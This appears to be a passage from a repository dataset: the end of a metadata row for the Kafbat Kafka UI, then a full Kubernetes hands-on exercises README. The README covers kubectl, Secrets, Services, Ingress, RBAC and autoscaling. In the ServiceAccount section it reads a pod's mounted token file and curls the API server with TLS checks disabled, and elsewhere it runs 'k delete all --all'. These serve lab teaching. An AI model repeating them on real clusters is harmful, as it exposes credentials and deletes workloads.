'apache', 'kafka', 'intuitive', 'user', 'interface', 'topic', 'kafbat', 'ui', 'make', 'easy', 'create', 'topic', 'browser', 'several', 'click', 'pasting', 'parameter', 'viewing', 'topic', 'list', 'possible', 'jump', 'connector', 'view', 'corresponding', 'topic', 'topic', 'consumer', 'back', 'forth', 'convenient', 'navigation', 'connector', 'overview', 'topic', 'setting', 'message', 'let', 'say', 'want', 'produce', 'message', 'topic', 'kafbat', 'ui', 'send', 'write', 'kafka', 'topic', 'without', 'effort', 'specifying', 'parameter', 'viewing', 'message', 'list', 'schema', 'registry', 'supported', 'type', 'schema', 'json', 'schema', 'protobuf', 'schema', 'producing', 'encoded', 'message', 'add', 'schema', 'topic', 'schema', 'registry', 'step', 'easy', 'click', 'interface', 'getting', 'started', 'run', 'kafbat', 'ui', 'use', 'either', 'docker', 'image', 'build', 'jar', 'file', 'quick', 'start', 'demo', 'run', 'access', 'web', 'ui', 'http', 'command', 'sufficient', 'try', 'thing', 'done', 'trying', 'thing', 'proceed', 'persistent', 'installation', 'persistent', 'installation', 'please', 'refer', 'configuration', 'page', 'proceed', 'app', 'configuration', 'useful', 'configuration', 'related', 'link', 'web', 'ui', 'cluster', 'configuration', 'wizard', 'configuration', 'file', 'explanation', 'docker', 'compose', 'example', 'misc', 'configuration', 'property', 'helm', 'chart', 'quick', 'start', 'building', 'source', 'quick', 'start', 'building', 'liveliness', 'readiness', 'probe', 'liveliness', 'readiness', 'endpoint', 'info', 'endpoint', 'build', 'info', 'located', 'configuration', 'option', 'environment', 'property', 'could', 'found', 'contributing', 'please', 'refer', 'contributing', 'guide', 'guide', 'support', 'fully', 'independent', 'team', 'member', 'contribute', 'free', 'time', 'support', 'crucial', 'u', 'wish', 'sponsor', 'u', 'take', 'look']","['topic', 'ui', 'configuration', 'kafbat', 'kafka']",2,0,0,"['kafbat', 'ui', 'free', 'web', 'ui', 'monitor', 'manage', 'apache', 'kafka', 'cluster', 'interface', 'feature', 'feature', 'overview', 'the', 'interface', 'topic', 'message', 'schema', 'registry', 'get', 'start', 'quick', 'start', 'demo', 'run', 'persistent', 'installation', 'some', 'useful', 'configuration', 'relate', 'link', 'helm', 'chart', 'building', 'source', 'liveliness', 'readiness', 'probe', 'configuration', 'option', 'contribute', 'support']",18,"['ui', 'interface', 'feature', 'start', 'configuration']",2,314.0,5.0,"[com.github.eirslett:frontend-maven-plugin,io.fabric8:docker-maven-plugin,io.qameta.allure:allure-maven,maven-resources-plugin,org.antlr:antlr4-maven-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.openapitools:openapi-generator-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,pl.project13.maven:git-commit-id-plugin]",0.0,4.0,1.0,7526,32.51515151515152,5.374650512581547,"['Interface -> https://raw.githubusercontent.com/kafbat/kafka-ui/images/overview.gif', 'secure -> https://ui.docs.kafbat.io/configuration/authentication', 'use -> https://ui.docs.kafbat.io/configuration/serialization-serde', 'manage permissions -> https://ui.docs.kafbat.io/configuration/rbac-role-based-access-control', 'obfuscate -> https://ui.docs.kafbat.io/configuration/data-masking', 'http://localhost:8080 -> http://localhost:8080', 'persistent installation -> https://ui.docs.kafbat.io/quick-start/persistent-start', 'configuration -> https://ui.docs.kafbat.io/configuration/configuration-file', 'Web UI Cluster Configuration Wizard -> https://ui.docs.kafbat.io/configuration/configuration-wizard', 'Configuration file explanation -> https://ui.docs.kafbat.io/configuration/configuration-file', 'Docker Compose examples -> https://ui.docs.kafbat.io/configuration/compose-examples', 'Misc configuration properties -> https://ui.docs.kafbat.io/configuration/misc-configuration-properties', 'Quick start -> https://ui.docs.kafbat.io/configuration/helm-charts/quick-start', 'Quick start -> https://ui.docs.kafbat.io/development/building/prerequisites', 'here -> https://ui.docs.kafbat.io/configuration/misc-configuration-properties', 'contributing guide -> https://ui.docs.kafbat.io/development/contributing', 'here -> https://github.com/sponsors/kafbat']",17
seifrajhi/Kubernetes-practical-exercises-Hands-on,main,"# Practical Kubernetes Exercices

This repo provides some resources to learn Kubernetes through practical exercises for self study to learn how easy it is to understand and master Kubernetes complexity and problems.

Kubernetes is easy to understand, even if it looks hard at the first look on the icons or the resources map, this course is about to help you to understand K8s and learn how to start!

![icons-all](images/icons-all.png ""icons-all"")

![k8s-resources-map](images/k8s-resources-map.png ""k8s-resources-map"")


## Prerequisites

It would be nice if you know what `kubectl` is and have a basic understanding of running conatiners with docker / containerd or cri-o.

## Preparation

To get prepared please install at least kubectx and kns with krew from this list and make sure to have bash completion for kubectl in place:

## Tools we use

- [mkcert](https://github.com/FiloSottile/mkcert)
- watch  
  - Mac setup:
    ````
    brew install watch
- [oh-my-zsh](https://github.com/ohmyzsh/ohmyzsh)
  - activate autocompletion
    - [Mac setup](https://docs.brew.sh/Shell-Completion)
    - [kubectl plugin](https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kubectl)
- [git](https://git-scm.com/)
- [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)  
  - mac setup:
    ```
    brew install kubernetes-cli
- [kubectx & kubens](https://github.com/ahmetb/kubectx)


[The Golden Kubernetes Tooling and Helpers list](http://bit.ly/kubernetes-tooling-list)

We can use any Kubernetes cluster (> 1.21) on our local machine or in the cloud. For online trainings we recommend to have either k3s installed with k3d, use Kind, or Docker for Desktop.  

We'll use some slides from:

[Kubernauts Kubernetes Trainings Slides](https://goo.gl/Hzk2sd)

and refer to some resources from:

[Kubernauts Kubernetes Learning Resources List](https://goo.gl/Rywkpd)

## Kubernetes  Guides

### Networking

The purpose of [this website](https://www.tkng.io/) is to provide an overview of various Kubernetes networking components with a specific focus on exactly how they implement the required functionality.

The guide is split into multiple parts which can be studied mostly independently, however they all work together to provide a complete end-to-end cluster network abstractions.

Where possible, every topic in this guide will include a dedicated [hands-on labs](https://www.tkng.io/lab/) which can be spun up locally in a matter of minutes. 

### Security
 
The Security checklist aims at providing a basic list of guidance with links to more comprehensive documentation on each topic. It does not claim to be exhaustive and is meant to evolve.

1- https://kubernetes.io/docs/concepts/security/security-checklist/

2- https://github.com/magnologan/awesome-k8s-security

3- https://github.com/freach/kubernetes-security-best-practice

4- https://medium.com/@seifeddinerajhi/kubernetes-security-assessment-guidelines-and-necessary-checklist-9a326f341b68

5- https://medium.com/@seifeddinerajhi/owasp-kubernetes-top-10-a-comprehensive-guide-f03af6fd66ed

6- https://eksclustergames.com:  Kubernetes CTF (Capture The Flag) challenges for EKS.

7- https://github.com/andifalk/secure-development-on-kubernetes: Slides and Demos for ""Secure Development on Kubernetes"" talk


7- [A curated list for Awesome Kubernetes Security resources](https://github.com/magnologan/awesome-k8s-security) - A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos.


8- [Kubernetes Security Checklist and Requirements](https://github.com/Vinum-Security/kubernetes-security-checklist) - Kubernetes Security Checklist and Requirements - All in One (authentication, authorization, logging, secrets, configuration, network, workloads, dockerfile).

9- [Kubernetes Hardening Manual](https://github.com/seifrajhi/kubernetes-hardening-checklist-guidance) -  Kubernetes Hardening Guidance.


### Storage

- The key concepts of Kubernetes storage, including [PVs, PVCs, and StorageClass](https://medium.com/@seifeddinerajhi/understanding-storage-in-kubernetes-ee2c19001aae)

### Misc

- Kelsey Hightower's open-source guide, [Kubernetes the Hard Way](https://github.com/kelseyhightower/kubernetes-the-hard-way), goes through how to bootstrap a Kubernetes cluster without the use of installers or scripts. 


- [Learnk8s](https://learnk8s.io/): Develop the knowledge and skills to get the most out of Kubernetes with hands-on online courses and instructor-led classes.

- [Introduction to Kubernetes Lecture Notes](https://github.com/kaan-keskin/introduction-to-kubernetes/tree/main): Notes about Kubernetes resources  

- [Kubernetes Handbook](https://github.com/rootsongjc/kubernetes-handbook)

- [Kubeapps](https://github.com/vmware-tanzu/kubeapps): A web-based UI for deploying and managing applications in Kubernetes clusters

- [Start learning Kubernetes today](https://kubebyexample.com/)

- [Step by step guide to learning Kubernetes](https://roadmap.sh/kubernetes)

- [Kubernetes the Harder Way](https://github.com/ghik/kubernetes-the-harder-way) A guide to setting up a production-like Kubernetes cluster on a local machine


- [Kubernetes mind map](https://betterprogramming.pub/6-important-things-you-need-to-run-kubernetes-in-production-d573d61258c5): 6 Important Things You Need to Run Kubernetes in Production.

- [Awesome Kubernetes Resources](https://github.com/tomhuang12/awesome-k8s-resources) - A curated list of awesome Kubernetes tools and resources.

### Useful aliases

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
alias k=""kubectl""
alias kx=""kubectx""
alias kn=""kubens""
alias kgp=""kubectl get pods""
alias kgel=""k get events --sort-by=.metadata.creationTimestamp""
```
</p>
</details>


## Kubectl CheatSheet and Goodies

https://kubernetes.io/docs/reference/kubectl/cheatsheet/

https://github.com/dennyzhang/cheatsheet-kubernetes-A4

<details><summary>Expand here to see the solution</summary>
<p>

```bash
k get events --sort-by=.metadata.creationTimestamp # List Events sorted by timestamp

k get services --sort-by=.metadata.name # List Services Sorted by Name

k get pods --sort-by=.metadata.name

k get endpoints

k explain pods,svc

k get pods -A # --all-namespaces 

k get nodes -o jsonpath='{.items[*].spec.podCIDR}'

k get pods -o wide

k get pod my-pod -o yaml --export > my-pod.yaml  # Get a pod's YAML without cluster specific information

k get pods --show-labels # Show labels for all pods (or other objects)

k get pods --sort-by='.status.containerStatuses[0].restartCount'

k cluster-info

k api-resources

k api-resources -o wide

kubectl api-resources --verbs=list,get # All resources that support the ""list"" and ""get"" request verbs

k get apiservice
```
</p>
</details>

### k create namespace imperative via declarative

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create ns <namespace name, e.g. your name or your project!>
k create ns --dry-run test -o yaml > test-ns.yaml
k create -f test-ns.yaml
k delete ns test
```

</p>
</details>

### k create / run pods or deploymens with dry-run

<details>
   <summary>Expand here to see the solution</summary>
<p>

```yaml
# old school (going to get deprecated)
k run --generator=run-pod/v1 <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

k run --generator=run-pod/v1 ""nginx-pod"" --image=nginx -o yaml --dry-run > nginx-pod.yaml

or

k run --restart=Never <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

or (new school with --dry-run=client)

k run nginx-pod --image=nginx -o yaml --dry-run=client > nginx-pod.yaml

k create <object> <name> <options> --dry-run -o yaml > <objectname.yaml>

k create deployment nginx-deployment --image=nginx --dry-run -o yaml > nginx-deployment.yaml

cat nginx-pod.yaml

cat nginx-deployment.yaml

k create -f nginx-pod.yaml

# create a service via exposing the pod

k expose pod nginx-pod --port=80

k get svc

k port-forward service/nginx-pod 8080:80

or

k proxy

open http://127.0.0.1:8001/api/v1/namespaces/default/pods/nginx-pod/proxy/

# open a new terminal session

curl http://127.0.0.1:8080/

k delete all --all # with caution!!!

k create -f nginx-deployment.yaml

k get all

k get all -A

k expose deployment nginx-deployment --port=80

k port-forward service/nginx-deployment 8080:80

k scale --replicas 3 deployment nginx-deployment

k edit deployment nginx-deployment

vi nginx-deployment.yaml # adapt the number of replicas, e.g. to 2

k apply -f nginx-deployment.yaml

```
</p>
</details>

### k get events and logs, describe objects

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
kx
kn
k delete all --all # with caution!!!
k apply -f 0-nginx-all.yaml
k get all
# where is the ingress?
k get ingress # ingress objects are not namespaced
k get events
k get events -A
k get events -n <namespace name>
k logs nginx-<press tab>
k describe pod nginx-<press tab>
k describe deployment nginx
k describe replicasets nginx-<press tab>
```
</p>
</details>

### Merging contexts (e.g. merge 2 kubeconfigs from 2 cluster contexts)

Sometimes you'll need to merge multiple kubeconfigs into a single file, here you go:

<details><summary>Expand here to see the solution</summary>
<p>

```bash
KUBECONFIG=file1:file2:file3 kubectl config view --merge --flatten > my_new_kubeconfig
or
cp ~/.kube/config ~/.kube/config.bak
KUBECONFIG=/my/new/kubeconfig:~/.kube/config.bak kubectl config view --flatten > my_new_kubeconfig
# test it
export KUBECONFIG=my_new_kubeconfig
kx
cp my_new_kubeconfig ~/.kube/config
```
</p>
</details>

Don't miss: Mastering the KUBECONFIG file by Ahmet Alp Balkan:

https://ahmet.im/blog/mastering-kubeconfig/

### Kubernetes Secrets are not secret

Secrets are resources containing keys with base64 encoded values. Secrets are not encrypted by default, they are only encoded and can get decoded easily by everyone who has access to a namespace or to the whole cluster.

Secret values can be exposed to pods as environment variables or mounted as files.

In order to create a secret from a text file, you can run the following, This creates a generic secret named secretname and automatically encodes the value as base64:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
echo -n ""yourvalue"" > ./secret.txt
k create secret generic secretname --from-file=./secret.txt
k describe secrets secretname
k get secret secretname -o yaml
echo 'eW91cnZhbHVl' | base64 --decode
# or
k create secret generic mysecret --dry-run -o yaml --from-file=./secret.txt > secret.yaml
k create -f secret.yaml
# or
k create secret generic mysecret --dry-run -o yaml --from-literal=secret.txt=yourvalue > secret.yaml
```
</p>
</details>

#### Further reading:

Since K8s secrets are not so secret, there are some ways to keep you secrets secret:

https://learnk8s.io/kubernetes-secrets-in-git

https://kubernetes.io/docs/tasks/inject-data-application/distribute-credentials-secure/#create-a-pod-that-has-access-to-the-secret-data-through-environment-variables



### Kubernetes ConfigMaps

A ConfigMap is an object consisting of key-value pairs which can be injected into your application.

With a ConfigMap you can separate configuration from your Pods. This way, you can prevent hardcoding configuration data.

ConfigMaps are useful for storing and sharing non-sensitive, unencrypted configuration information. Sensitive information should be stored in a Secret instead.

Exercise:

Create a ConfigMap named kubernauts that contains a key named dev with the value ops.

With the --from-literal argument passed to the k create configmap command you can create a ConfigMap containing a text value.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create cm kubernauts --from-literal=dev=ops --dry-run -o yaml > cm-kubernauts.yaml
cat cm-kubernauts.yaml
echo -n ""ops"" > dev
k create cm kubernauts --from-file=./dev
k get cm
k describe cm kubernauts
k delete cm kubernauts
k create -f cm-kubernauts.yaml
k describe cm kubernauts
```
</p>
</details>

Using this ConfigMap, we can inject data in our application:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat 0-nginx-configmap.yaml
k create -f 0-nginx-configmap.yaml
```
</p>
</details>



## Whoami, Whoareyou and Whereami Problems

### What We’ll Do

We’ll use a pre-made container — containous/whoami — capable of telling you where it is hosted and what it receives when you call it.

If you'd like to build the container image with docker, do:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
git clone https://github.com/containous/whoami.git
docker build -t whoami .
docker tag whoami kubernautslabs/whoami
docker push kubernautslabs/whoami
docker images | head
```

</p>
</details>

We’ll define two different deployments, a whoami and a whoareyou deployment that will use `containous/whoami` container image.

We’ll create a deployment to ask Kubernetes to deploy 2 replicas of whoami and 3 replicas of whoareyou.

We’ll define two services, one for each of our Pods.

We’ll define Ingress objects to define the routes to our services to the outside world.

We’ll use our Nginx Ingress Controller on our Rancher Cluster.

Explanations about the file content of whoami-deployment.yaml:

We define a “deployment” (kind: Deployment)

The name of the object is “whoami-deployment” (name: whoami-deployment)

We want two replica (replicas: 2)

It will deploy pods that have the label app:whoami (selector: matchLabels: app:whoami)

Then we define the pods with the (template: …) which will have the whoami label (metadata:labels:app:whoami)

The Pods will host a container using the image containous/whoami (image:containous/whoami)

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k apply -f 1-whoami-deployment.yaml
k get all
# we expose the deployment with a service of type ClusterIP
k create -f 1-whoami-service-ClusterIP.yaml
k get svc
k port-forward service/whoami-service 8080:80
# in a new terminal session call
curl 127.0.0.1:8080
k delete svc whoami-service
# create a service of type NodePort
k create -f 1-whoami-service-nodeport.yaml
k get svc
curl csky08:30056 # adapt the nodeport for your env. please !
curl csky09:30056
curl csky10:30056
k delete svc whoami-service-nodeport
k create -f 1-whoami-service-loadbalancer.yaml
k get svc
curl <EXTERNAL-IP> # the external-ip is given from the LB IP pool above
k create -f 2-whoareyou-all.yml
k get all
k get svc
k get ing
curl <HOSTS value from ingress>
# are you happy? ;-)
```

</p>
</details>

## DNS based Service discovery with whereami kubia pod

### What We’ll Do

We'll use a slightly extended node.js app (which is a simple web server) from the [Kubernetes in Action book by Marko Lukša](https://www.amazon.com/-/en/Marko-Luksa/dp/1617293725) in 2 different namespaces ns1 and ns2 to demonstrate the DNS based services discovery. 

A service provides a Virtual IP (VIP) address, which means the Service IP is not bound to a physical network interface. A service acts like an internal loadbalancer in K8s! The magic of of routing trafic through the VIP is implemented by IPtable rules managed by kube-proxy!

A service can be called through its FQDN in the form of:

`$SERVICE_NAME.$NAMESPACE.svc.cluster.local`

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd whereami
k create ns ns1
k create ns ns2
kn ns1
cat kubia-deployment.yaml   
k create -f kubia-deployment.yaml
k create -f kubia-deployment.yaml -n ns2
k expose deployment kubia
k get svc
k expose deployment kubia -n ns2
k get svc -n ns2
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k scale deployment kubia -n ns2 --replicas 3
# repeat the service call many times and see how loadbalancing works
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k exec -n ns2 -it kubia-<press tab> -- curl kubia.ns1.svc.cluster.local:8080
k exec -it kubia-<press tab> -- ping kubia.ns2.svc.cluster.local
--> PING kubia.ns2.svc.cluster.local (10.43.109.89) 56(84) bytes of data.
# you don't get any pong, why?
# ssh into a node and examine the IPtable rules
sudo iptables-save | grep kubia
```
</p>
</details>

### Headless Services for Stickiness

![hadless](images/headless-cluster-ip.png ""headless-cluster-ip"")

As we learned services are exposed by default through the type ClusterIP, they work as an internal layer 4 load-balancer and provide a VIP with a stable DNS address, where the clients can connect to. The service forwards the connections to one of the pods which are backing the service via round robin.

This works fine and is desired for stateless apps which need to connect to one of the pods randomly and gain more performance through trafic routing via load balancing.

But in some cases where stickiness is needed and the clients need to connect to a particular pod for session or data stickiness, then we need to define our service without ClusterIP, which is by default the head of the service (that's the VIP).

To do that we need to define our service as a `headless` service, let's see that in action with the whereami service and our utils pod.

In the following we expose the kubia deployment as a headless service by setting the ClusterIP to `None`, scale the deployment and do a DNS query to both services with `host kubia-headless` and `host kubia-clusterip` from within the util client pod. As you'll see our client pod always connects to the first IP from the DNS response, if we curl the headless service. This means no load balancing happens, the call is `Sticky`!

The second curl to the service with ClusterIP does load balancing and distributes the traffic between pods.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k delete svc kubia
k expose deployment kubia --name kubia-headless --cluster-ip None
k expose deployment kubia --name kubia-clusterip
k expose deployment kubia --name kubia-lb --type=LoadBalancer
k scale deployment kubia --replicas 3
k run --generator=run-pod/v1 utils -it --image kubernautslabs/utils -- bash
# inside the utils container
host kubia-headless
host kubia-clusterip
# what is the difference here?
for i in $(seq 1 10) ; do curl kubia-headless:8080; done
# hits kubia only on one node? 
for i in $(seq 1 10) ; do curl kubia-clusterip:8080; done
# does load balancing via the head ;-)
exit
mkcert '*.whereami.svc'
k create secret tls whereami-secret --cert=_wildcard.whereami.svc.pem --key=_wildcard.whereami.svc-key.pem
cat kubia-ingress-tls.yaml
k create -f kubia-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.whereami.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
curl https://my.whereami.svc
for i in $(seq 1 10) ; do curl https://my.whereami.svc; done
# the ingress controller does load balancing, although the kubia-headless is defined as the backend with serviceName: kubia-headless!
```

</p>
</details>

## Ingress with TLS

![ingress-controller](images/ingress-controller-traefik.png ""ingress-controller-traefik"")

Often we need to use an ingress object to provide path based or (sub-) domain based routing with TLS termination and other capabilities defined through annotations in the ingress resource.

By creating an ingress for a service, the ingress controller will create a single entry-point to the defined service in the ingress resource on every node in the cluster.

In the follwoing we're using the traefik ingress controller and an ingress object to provide path based or (sub-) domain based routing with TLS termination with a valid mkcert made TLS certificate on our lab environment.


<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd ..
kn default
mkcert '*.ghost.svc'
k create secret tls ghost-secret --cert=_wildcard.ghost.svc.pem --key=_wildcard.ghost.svc-key.pem
# alternatively, if you can't or you don't want to use mkcert, you can create a selfsigned cert with:
# openssl genrsa -out tls.key 2048
# openssl req -new -x509 -key tls.key -out tls.cert -days 360 -subj /CN=my.ghost.svc
# k create secret tls ghost-secret --cert=tls.cert --key=tls.key
cat 3-ghost-deployment.yaml
k create -f 3-ghost-deployment.yaml
k expose deployment ghost --port=2368
cat 3-ghost-ingress-tls.yaml
k create -f 3-ghost-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.ghost.svc admin.ghost.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
open https://my.ghost.svc
open https://admin.ghost.svc/ghost
# change the service type to LoadBalancer and access ghost with the loadbalancer IP on port 2368 or on any other node (works on k3s with trafik only), e.g.:
open http://node2:2368
# scale the deployment to have 2 replicas and see how the backend ghost backened https://admin.ghost.svc/ghost doesn't work.
```

</p>
</details>

## Multi-Container Pods

Create a Pod with two containers, both with image alpine and command ""echo hello; sleep 3600"". Connect to the second container and run 'ls'.

The easiest way to do it is to create a pod with a single container and save its definition in a YAML file and extend it with an additional container:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k run alpine-2-containers --image=alpine --restart=Never -o yaml --dry-run -- /bin/sh -c 'echo hello;sleep 3600' > alpine-pod.yaml
```

Copy/paste the container related values, so your final YAML should contain the following two containers (make sure those containers have a different name):

```YAML
containers:
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine1
    resources: {}
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine2
    resources: {}
```

```yaml
k create -f alpine-pod-2-containers.yaml # alpine-pod-2-containers.yaml is in this repo
# exec / ssh into to the alpine2 container
k exec -it alpine-2-containers -c alpine2 -- sh
ls
exit

# or just an one-liner
k exec -it alpine2 -c alpine2 -- ls

# cleanup
k delete pod alpine-2-containers
```

</p>
</details>


### Shared Volume

We'll extend the above alpine-2-containers with a shared volume of type emptyDir named `share` with a volumeMount for each container with a mountPath `/tmp/share1` and `/tmp/share2` as follow:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat alpine-pod-share-volumes.yaml
k apply -f alpine-pod-share-volumes.yaml
k exec -it alpine-2-containers-share-volume -c alpine1 -- sh
touch /tmp/share1/sharefile
echo ""test-share1"" > /tmp/share1/sharefile
cat /tmp/share1/sharefile
exit
k exec -it alpine-2-containers-share-volume -c alpine2 -- cat /tmp/share2/sharefile
```

</p>
</details>

## Security

Kubernetes Security is a huge topic and security hardening is a nice problem which everyone has to implement according to their security requirements and the governance model of their organization. We're going only to scratch the surface of K8s security here and highly recommend to go through the following resources by Michael Hausenblas, Liz Rice and the community.

https://kubernetes-security.info/

https://learn.hashicorp.com/vault/getting-started-k8s/sidecar

https://github.com/k8s-sec/k8s-sec.github.io


### Service Accounts

In K8s each namespace has a default ServiceAccount, named `default`. A ServiceAccount is a namespaced resource used by containers running in a Pod, to communicate with the API server of the Kubernetes cluster. ServiceAccounts with limited permissions are often used to apply the principle of least priviledge.

```bash
k get sa --all-namespaces | grep default
k get sa default -o yaml
k get secret default-<press tab> -o yaml
```

The data key of this Secret has several key/pairs:

```yaml
apiVersion: v1
kind: Secret
data:
  ca.crt: LS0tLS1CRUdJTi...
  namespace: ZGVmYXVsdA==
  token: ZXlKaGJHY2lP...
metadata:
  annotations:
    kubernetes.io/service-account.name: default
...
```

The token is the Base64 encoding of the JWT used to authenticate against the API server.
Let's get the token and head to jwt.io and use the debugger to decode the token.

```bash
kubectl run -it alpine --restart=Never --image=alpine -- sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
exit
open https://jwt.io/
```

Paste the token and get the payload, which looks similar to this:

```
{
  ""iss"": ""kubernetes/serviceaccount"",
  ""kubernetes.io/serviceaccount/namespace"": ""default"",
  ""kubernetes.io/serviceaccount/secret.name"": ""default-token-24pbl"",
  ""kubernetes.io/serviceaccount/service-account.name"": ""default"",
  ""kubernetes.io/serviceaccount/service-account.uid"": ""147e134a-43d0-4c76-ad01-bccc59f8acb9"",
  ""sub"": ""system:serviceaccount:default:default""
}
```

We can see the service account default is linked to the namespace where it exists and is using the secret default-token-24pbl. This token is available in the filesystem of each container of the Pod of the attached ServiceAccount.

### Using a Custom ServiceAccount

A Service Account on its own is on not so useful, we need to provide rome rights and permissions to it through a set of rules defined through roles or cluster roles using the RBAC implementation in K8s.  


### RBAC (Role Based Access Control)

RBAC in K8s is activated by default and helps to provide access to resources (objects) like namespaces, pods, services, etc. to those Subjects or Entities like users, group or service accounts who need access to some resources and deny access to other resources who do not need access to them. RBAC increases security in K8s projects and shall be defined through a governance model in each organization (but in the theorie, you know we are all admins ;-)).

RBAC is implemented through Role, ClusterRole, RoleBinding, and ClusterRoleBinding.

#### Role

A Role defines what you or a subject can do to a set of resources, like get, set, delete, etc.A Role contains a set of rules which define a set of permissions. Roles are used to assigning permissions to resources on the namespace level.

#### ClusterRole

Similar to Role, ClusterRole can grant permissions on the Cluster Level such as giving resource permissions across all namespaces in the cluster.

#### RoleBinding and ClusterRoleBinding

RoleBinding and ClusterRoleBinding are used to grant permissions and priviledges to Subjects or Entities on the namespace (project RoleBinding) level or on the cluster level (ClusterRoleBinding).

![RBAC](images/rbac.png ""rbac"")

#### What We’ll Do

We create a new namespace myapp and a new custom ServiceAccount `mysa`, create a new role `podreader` with the permission to get and list pods and create a rolebinding `mypodviewer` to bind the ServiceAccount to the role podreader in the namespace `myapp`.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k get clusterroles | wc -l
# 62
k get clusterroles
k describe clusterrole view
k describe clusterrole view | grep pods
# the view role allows your application access to many other resources such as deployments and services.
k create namespace myapp
k -n=myapp create serviceaccount mysa
k -n myapp create role podreader --verb=get --verb=list --resource=pods
k -n myapp describe role/podreader
# nice, the role podreader can only view now, but we need to attach the role podreader to our application, represented by the service account myapp. 
k -n myapp create rolebinding mypodviewer --role=podreader --serviceaccount=myapp:mysa
k -n myapp describe rolebindings mypodviewer
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list pods
# yes :-)
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list services
# no :-)
```
</p>
</details>

We extend our alpine pod with the key `serviceAccountName` and the value `mysa`, apply the change and run a shell in the alpine-pod, get the toke belonging to the `mysa` ServiceAccountand use it to list the pods in the default namespace and the myapp namespace to see the differences:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml

kn myapp
cat alpine-pod-service-account.yaml
k apply -f alpine-pod-service-account.yaml
k describe pod alpine-sa
k get sa
k get secrets
k exec -it alpine-sa -- sh
apk add curl
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/default/pods/ --insecure
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/myapp/pods/ --insecure
# what works, what doesn't work?

```
</p>
</details>

#### Further reading:

[Kubernetes Tips: Using a ServiceAccount](https://medium.com/better-programming/k8s-tips-using-a-serviceaccount-801c433d0023)

#### Permission Manager

--> ToDo

## 3-Tier App (MVC)

Please read the README and the related blog post in the [subfolder](3-tier-app/README.md)  3-tier-app and try to understand and get the todo list app up and running.

# Day 2 Operation

Day 2 operation is mainly about implementing some principles like selfhealing and autoscaling for our apps AND the infrastructure components like nodes and K8s components itself and define resources limits, liveness and readiness probes for our apps, run continious security auditing, apply GitOps principles and style, etc.

In this first section we'll go through app auto scaling with Horizontal Pod Autoscaler.

![hpa](images/pod-autoscaling-hpa.png ""hap"")

## Pod AutoScaling with HPA (Horizontal Pod Autoscaler)

```bash
kubectl run hpa-example --image=k8s.gcr.io/hpa-example --requests=cpu=200m --expose --port=80
# create HPA based on CPU usage
kubectl autoscale deployment hpa-example --cpu-percent=50 --min=1 --max=10
# In another terminal run
kubectl run -i --tty generate-load --image=busybox /bin/sh
# Inside the above container run a loop bash command to stress the CPU
while true; do wget -q -O- http://hpa-example.default.svc.cluster.local; done
# Check HPA Status
kubectl get hpa
```

- [Simplify Kubernetes day 2 ops with Palette Cluster Profiles](https://www.spectrocloud.com/blog/kubernetes-day-2-operations-with-cluster-profiles)

## Labs and exercises and hackaton:

[Labs and exercises and hackaton repo](./Labs-and-exercises/)  to help you learn Kubernetes. 

## GitOps

GitOps is an operating model for Kubernetes and other cloud native technologies. It provides a set of best practices that unifies deployment, management, and monitoring for clusters and applications. Another way to put it is: a path towards a developer experience for managing applications; where end-to-end CI and CD pipelines and Git workflows

- https://www.eksworkshop.com/docs/automation/gitops/

- https://medium.com/@seifeddinerajhi/gitops-ci-cd-automation-workflow-using-github-actions-argocd-and-helm-charts-deployed-on-k8s-3811b253030b


- [Provides our opinionated point of view on how GitOps can be used to manage the infrastructure, services and application layers of K8s based systems](https://github.com/cloud-native-toolkit/multi-tenancy-gitops): GitOps Production Deployment Guide

## TroubleShooting

- [COMMON KUBERNETES ERRORS AND HOW THEY IMPACT CLOUD DEPLOYMENTS](https://cloudtweaks.com/2023/01/common-kubernetes-errors/)

- [Exit Codes In Containers & Kubernetes – The Complete Guide](https://komodor.com/learn/exit-codes-in-containers-and-kubernetes-the-complete-guide/)

